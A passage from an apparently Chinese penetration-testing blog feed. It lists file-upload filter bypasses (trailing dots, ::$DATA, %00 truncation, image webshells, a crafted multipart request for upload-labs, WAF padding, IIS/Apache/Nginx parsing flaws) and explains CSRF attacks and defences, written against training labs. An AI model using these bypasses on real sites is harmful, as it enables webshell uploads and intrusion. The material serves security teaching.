id="7-黑名单过滤，没有过滤点"><a href="#7-黑名单过滤，没有过滤点" class="headerlink" title="7. 黑名单过滤，没有过滤点"></a>7. 黑名单过滤，没有过滤点</h3><p>添加点即可绕过后端的php检测，而且可以正常解析。参考upload-labs Pass-7。</p><p><code>shell.php.</code></p><p>另外，遇到move_uploaded_file()函数时，其有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以直接上传php文件，然后抓包，添加&#x2F;. 就可以绕过黑名单。参考upload-labs Pass-19。</p><p><code>shell.php/.</code></p><p><strong>【upload-labs Pass-20】</strong>：</p><p>查看该题源码可知，若提交的保存的文件名save_name不是数组，那就以点来分割得到数组$file。而下面的EXP则是直接提交数组。</p><p>该页面会将数组的最后一个元素看作后缀名进行白名单校验，通过校验后将第一个元素和点以及最后一个元素拼接得到文件名。但是在取最后一个元素时存在漏洞：<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>。可以看如下POST请求体，save_name[0]为shell.php&#x2F;，save_name[2]为jpg，这样校验后缀名时取的是index为2的jpg。但是在拼接文件名时，由于未给save_name[1]赋值，所以<code>count($file)</code>的结果是2而非3，所以<code>$file[count($file) - 1]</code>的值为空，而非jpg。最后得到的文件名就为<code>shell.php/.</code>，又由于move_uploaded_file()函数会忽略这个&#x2F;.，所以该文件会被保存为shell.php。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">shell.php/</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi--</span><br></pre></td></tr></table></figure><h3 id="8-黑名单过滤，没有过滤-DATA"><a href="#8-黑名单过滤，没有过滤-DATA" class="headerlink" title="8. 黑名单过滤，没有过滤::$DATA"></a>8. 黑名单过滤，没有过滤::$DATA</h3><p>参考upload-labs Pass-8。</p><blockquote><p>在 Windows 操作系统中，::$DATA 是一种用于隐藏文件的特殊附加数据流（Alternate Data Stream）。它是一种扩展文件属性，可以将额外的数据附加到一个文件中，而不会影响文件的主要内容。<br>附加数据流基于文件名和冒号之间的特殊语法，例如：file.txt::D A T A 。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得 : : DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。 这使得 ::DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得::DATA 可以被用于隐藏文件内容、存储元数据或其他需要与主文件相关但不希望直接显示给用户的信息。</p></blockquote><p><code>shell.php::$DATA</code></p><h3 id="9-黑名单过滤，改变符号或者多次换行"><a href="#9-黑名单过滤，改变符号或者多次换行" class="headerlink" title="9. 黑名单过滤，改变符号或者多次换行"></a>9. 黑名单过滤，改变符号或者多次换行</h3><p>比如BP抓包后，将双引号变为单引号，或者去掉文件名的双引号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=info4.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者只用一个双引号（引号没有闭合，安全狗会误以为是程序自带）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=&quot;info5.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者文件名内多次换行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br><span class="line">Content-Type:  image/jpeg</span><br></pre></td></tr></table></figure><h3 id="10-黑名单，；绕过"><a href="#10-黑名单，；绕过" class="headerlink" title="10. 黑名单，；绕过"></a>10. 黑名单，<code>；</code>绕过</h3><p><code>.jpg;.php</code></p><p>分号<code>;</code>代表语句的结束，安全狗检测文件名字符串时，检测到jpg就结束了，后面的.php略过。</p><h3 id="11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）"><a href="#11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）" class="headerlink" title="11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）"></a>11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）</h3><p>黑名单包括php、asp</p><p>破解：文件名双写：比如<code>shell.pphphp</code></p><h3 id="12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）"><a href="#12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）" class="headerlink" title="12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）"></a>12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）</h3><p>参考upload-labs Pass-11。</p><p>严格限制后缀为某几种，但是请求路径使用的是get请求（request请求）。</p><p>get请求会根据文件路径做了一个00截断，<code>../upload/1.php%00check.jpg</code>不会被白名单过滤，而且请求后路径就被截断，变成<code>../upload/1.php</code> 。</p><blockquote><p>00截断的操作环境<strong>需魔术引用开关magic_quotes_gpc为off状态</strong>，不然%00会被转义，导致攻击失效。</p><p>魔术引用开关magic_quotes_gpc会转义以下字符：</p><p>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL</p></blockquote><p>但是，该方法只能绕过接收参数时的判断，如果服务器对请求后得到的路径再进行白名单的判断，因为已经被get请求截断了，后缀变成php，还是会被检测到。</p><h3 id="13-白名单（post的-00截断绕过）"><a href="#13-白名单（post的-00截断绕过）" class="headerlink" title="13. 白名单（post的%00截断绕过）"></a>13. 白名单（post的%00截断绕过）</h3><p>参考upload-labs Pass-12。</p><p>严格限制后缀为某几种，但是请求路径使用的是post请求（request请求）。</p><p>post需要通过BP抓包修改数据包的文件名后缀部分，需要用二进制的方式去修改。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20190617182023127.png" alt="img" style="zoom:50%;"><h3 id="14-x3D-x3D-判断文件头-x3D-x3D-图片马"><a href="#14-x3D-x3D-判断文件头-x3D-x3D-图片马" class="headerlink" title="14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)"></a>14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)</h3><p>参考upload-labs Pass-14-17。</p><p>使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时可以使用图片马，文件后缀依然为php。此时webshell可以被解析为脚本，同时getimagesize也可以获取到图片信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="15-判断文件头且限制后缀"><a href="#15-判断文件头且限制后缀" class="headerlink" title="15. 判断文件头且限制后缀"></a>15. 判断文件头且限制后缀</h3><p>使用 <code>strrpos( $uploaded_name, &#39;.&#39; )</code> 函数来截取文件名中最后一个 <code>.</code> 后面的字符，来识别为上传的文件的后缀名，并只接受后缀名为 <code>jpg</code>，<code>jpeg</code>，<code>png</code> 的文件。同时使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时只能使用图片马：</p><p>windows</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> huaji.gif /b + shell.php /a shell.gif</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.jpg</span><br></pre></td></tr></table></figure><p>图片马需要通过命令注入漏洞<code>rename shell.jpg shell.php</code>来把上一步上传的 <code>shell.jpg</code> 重命名为 <code>shell.php</code>，然后利用文件包含漏洞才能执行，使用include包含。</p><p><code>include</code> 方法可以让当前页面去执行指定的另外一个文件中的代码内容。</p><p>存在如下文件：upload&#x2F;include.php，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>localhost:8080/upload/include.php?page=shell.php</code>可以借助蚁剑连接成功。</p><h3 id="16-php内置函数获取图片类型"><a href="#16-php内置函数获取图片类型" class="headerlink" title="16. php内置函数获取图片类型"></a>16. php内置函数获取图片类型</h3><p>比如getimagesize()、exif_imagetype()。</p><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。</p><p>exif_imagetype环境需要开启php_exit模块。如果函数出现报错，则需要去php.ini修改如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_mbstring.dll</span><br><span class="line">extension=php_exif.dll</span><br></pre></td></tr></table></figure><p>然后再重启服务器即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>); <span class="comment">//设置编码为UTF-8 不然乱码</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="comment">//通过get传值判断文件类型</span></span><br><span class="line"><span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行判断&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$image_type</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:GIF&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:png&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:未知&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上图片马绕过。</p><h3 id="17-上传后重命名（md5）"><a href="#17-上传后重命名（md5）" class="headerlink" title="17.  上传后重命名（md5）"></a>17.  上传后重命名（md5）</h3><p>使用了 <code>md5()</code> 函数对上传的文件的文件名进行重命名，重命名为 MD5 散列运算之后的值。可以防御通过 00 截断来解析一句话木马。同时使用了随机 Token 检查来增加修改数据包上传的难度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15622995660349.jpg" alt="img" style="zoom: 33%;"><h3 id="18-竞争条件攻击"><a href="#18-竞争条件攻击" class="headerlink" title="18. 竞争条件攻击"></a>18. 竞争条件攻击</h3><p>参考upload-labs Pass-18。</p><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShel脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作) , 攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p><h3 id="19-x3D-x3D-数据溢出-x3D-x3D"><a href="#19-x3D-x3D-数据溢出-x3D-x3D" class="headerlink" title="19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;"></a>19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;</h3><p>php文件被安全狗拦截：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898889066-ba927953-805b-446e-a0c8-28a8e437dcec.png" alt="image.png"></p><p>修改数据包上传<code>Content-Disposition: form-data; name=&quot;uploadfile&quot;;</code>中间插入大量的垃圾数据从而绕过。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898527403-03b55f1a-41a2-497a-a53b-61c5259b6895.png" alt="image.png"></p><h3 id="20-站库分离"><a href="#20-站库分离" class="headerlink" title="20. 站库分离"></a>20. 站库分离</h3><p>文件和网站放在不同的服务器上，即单独设置文件服务器的域名。这样就无法通过上传的文件对网站服务器进行渗透。</p><h1 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h1><h2 id="IIS6-0文件解析漏洞"><a href="#IIS6-0文件解析漏洞" class="headerlink" title="IIS6.0文件解析漏洞"></a>IIS6.0文件解析漏洞</h2><ol><li>IIS除了可以解析.asp后缀的脚本以外，<strong>还可以解析.cer和.asa后缀的文件</strong>。</li><li>特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行</li><li>特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行<br>IIS7.5文件解析漏洞<br>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</li></ol><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="Apache-httpd-多后缀解析漏洞"><a href="#Apache-httpd-多后缀解析漏洞" class="headerlink" title="Apache httpd 多后缀解析漏洞"></a>Apache httpd 多后缀解析漏洞</h3><p>主要是因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）</p><h3 id="Apache换行解析漏洞（CVE-2017-15715）"><a href="#Apache换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache换行解析漏洞（CVE-2017-15715）"></a>Apache换行解析漏洞（CVE-2017-15715）</h3><p>影响范围：2.4.0-2.4.29版本</p><p>原因：合法后缀配置文件中的正则表达式中$不仅匹配字符串结尾位置，还可以匹配\n或\r，在解析php时，1.php\x0A将按照.php进行解析，而’.php\x0A’ !&#x3D; ‘.php’,可能过滤时过滤了.php但没有过滤.php\x0A从而实现绕过。</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CSRF、SSRF</title>
    <link href="https://frankcao3.github.io/posts/25956"/>
    <id>https://frankcao3.github.io/posts/25956</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。利用了网站服务器只能检查发起请求的是不是用户的浏览器，而无法检查发起请求的是不是用户本意的这一漏洞。通常由于服务端没有对请求头做严格过滤引起的。</p><p><u>XSS利用的是站点内的信任用户</u>，由信任用户执行了含有恶意前端脚本的页面产生，攻击对象是访问页面的用户。而<u>CSRF则是通过搭建外部网站，受害者访问网站时被攻击者利用，通过盗取受害者身份，伪装来自受信任用户的请求来执行对受信任网站的攻击</u>。</p><p>CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。我们知道，绝大多数网站是通过cookie等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过XSS或链接欺骗等途径（在XSS中嵌入CSRF的链接），让用户在本机（即拥有身份cookie的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4dca552031d4403d9edc193d4a48d759.png"></p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801105831026.png" alt="image-20220801105831026" style="zoom: 67%;"><p>可能出现该漏洞的地方：</p><p><strong>存在添加、修改、删除操作的页面</strong>。</p><p>仅有查询的页面不会有该漏洞。</p><p>一般出现在中小型的网站，不属于严重漏洞。大型网站一般也比较安全，不会有这种漏洞。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>以pikachu靶场为例，在修改个人信息的页面点击提交。通过BP抓包可以看到所填写的个人信息是通过get方式提交的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094611582.png" alt="image-20220803094611582"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094522118.png" alt="image-20220803094522118"></p><p>那么通过修改get请求中的信息，就可以构造含有自己信息的URL。然后写入自己网站中新建的html。当受害者 <strong>在登录状态下访问</strong> 这个html（外部网站）时就会执行该URL（请求伪造，将个人信息修改为了黑客伪造的内容），达到跨站请求伪造的目的。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202616728.png" alt="image-20220711202616728"></p><p>或者也可以直接使用BP的CSRF功能，自动生成攻击用html。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202945583.png" alt="image-20220711202945583"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203019853.png" alt="image-20220711203019853"></p><p>复制出自动生成的攻击用html代码，修改其中个人信息的参数为自己的信息，然后另存为html</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203224926.png" alt="image-20220711203224926"></p><p>然后若受害者访问该html即可成功执行伪造的请求。</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>网站以post请求提交修改信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142717285.png" alt="image-20220803142717285"></p><p>写攻击页面，其中提交的信息为post请求格式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142920562.png" alt="image-20220803142920562"></p><p>接下来同样诱使用户访问我们自己写的恶意代码的网址即可。当用户再次返回时可以看到值已被修改。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>篡改目标站点上的用户数据</p><p>盗取用户隐私数据</p><p>作为其他攻击的辅助攻击手法</p><p>传播 CSRF 蠕虫</p><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>请求直接是个GET&#x2F;POST请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，<strong>抓包后，如果发现满足上面条件，然后没有referer验证，再去页面测试下</strong>，基本就可以确定存在不存在CSRF漏洞了。</p><h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul><li><p><strong>相同点</strong>：</p><p>XSS、CSRF、SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p></li><li><p><strong>不同点</strong>：</p><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的<strong>脚本语句被执行</strong>。<strong>攻击发生在本站</strong>。</p><p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息<strong>伪造用户请求</strong>发送至服务器。<strong>攻击是跨站的</strong>。 </p><p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板<strong>攻击内网或其他服务器</strong>。</p></li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="强制用户输入密码"><a href="#强制用户输入密码" class="headerlink" title="强制用户输入密码"></a>强制用户输入密码</h3><p>当用户发送重要的请求时需要输入原始密码。</p><h3 id="设置随机Token（最有效）"><a href="#设置随机Token（最有效）" class="headerlink" title="设置随机Token（最有效）"></a>设置随机Token（最有效）</h3><p>服务器每次向客户端返回操作页面时都会给客户端产生一个随机的 Token 值，客户端在页面进行操作时需要携带该 Token，服务器如果检查发现用户携带的 Token 和它产生的不一样，就会判断为攻击行为，拒绝执行。</p><p>使用token比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144026924.png" alt="image-20220803144026924"></p><p>在每次请求中加入了不同的token，等攻击者再利用这个token时，这个token已经过期，无法成功攻击。</p><p><strong>缺点：</strong></p><p><strong>难以给所有的请求都使用token</strong>。在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p><strong>难以保证 token 本身的安全</strong>。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。当用户访问黑客在论坛上发表的这个网站时，系统也会在这个地址后面加上论坛的 token，于是黑客就可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p><p>当然，攻击者可以实现用恶意脚本获取用户的token，然后拦截客户的请求再把 Token 值插入到客户的请求包中。但是这些操作已经超出CSRF攻击的范围。</p><h3 id="检验referer来源"><a href="#检验referer来源" class="headerlink" title="检验referer来源"></a>检验referer来源</h3><p>请求时判断请求链接是否为当前管理员正在使用的页面，要求 Referfer 必须是本服务器自己的主机名（同源检查）。比如：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144318067.png" alt="image-20220803144318067"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP REFERER&#x27;</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER NAME&#x27;</span>]) != <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//Get input</span></span><br><span class="line"><span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如，管理员在编辑文章，黑客发来恶意的修改密码的链接，因为修改密码页面管理员之前并没有在操作，所以攻击者诱骗受害者点击提交的请求中Referer 一定是空值，因此攻击失败。</p><p><strong>局限性：</strong></p><p>首先，<u>referer是可以通过抓包进行修改的</u>。</p><p>再者，<u>检查 Refer 信息并不能防范来自本域的攻击</u>。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。</p><p>同样，某些<u>直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息</u>，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。</p><h3 id="设置验证码"><a href="#设置验证码" class="headerlink" title="设置验证码"></a>设置验证码</h3><h3 id="限制请求只能为post"><a href="#限制请求只能为post" class="headerlink" title="限制请求只能为post"></a>限制请求只能为post</h3><h3 id="在HTTP-头中自定义属性并验证"><a href="#在HTTP-头中自定义属性并验证" class="headerlink" title="在HTTP 头中自定义属性并验证"></a>在HTTP 头中自定义属性并验证</h3><p>不把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p> 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h3 id="安全的会话管理-避免会话被利用"><a href="#安全的会话管理-避免会话被利用" class="headerlink" title="安全的会话管理(避免会话被利用)"></a>安全的会话管理(避免会话被利用)</h3><ol><li>不要在客户端端保存敏感信息(比如身份认证信息) ;</li><li>使页面关闭（退出）时会话过期；</li><li>设置会话过期机制，比如15分钟内无操作，则自动登录超时;</li></ol><h3 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h3><ol><li>敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码;</li><li>敏感信息的修改使用post ,而不是get ;</li><li>通过http头部中的referer来限制原页面</li><li>增加验证码：一般用在登录(防暴力破解)， 也可以用在其他重要信息操作的表单中(需要考虑可用性)。</li></ol><h1 id="x3D-x3D-SSRF-x3D-x3D-（更重要）"><a href="#x3D-x3D-SSRF-x3D-x3D-（更重要）" class="headerlink" 